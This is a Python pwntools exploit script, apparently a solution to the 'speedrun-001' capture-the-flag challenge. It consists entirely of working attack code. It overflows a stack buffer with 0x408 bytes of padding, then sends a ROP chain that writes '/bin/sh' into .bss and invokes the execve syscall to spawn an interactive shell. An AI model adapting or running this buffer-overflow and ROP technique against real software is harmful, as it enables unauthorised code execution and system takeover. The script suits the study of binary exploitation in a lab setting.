from pwn import *

target = process('./speedrun-001')

popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

writeGadget = p64(0x48d251) # mov qword ptr [rax], rdx ; ret

syscall = p64(0x40129c)

rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) #bss
rop += writeGadget

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall

payload = "0"*0x408 + rop

target.sendline(payload)

target.interactive() 
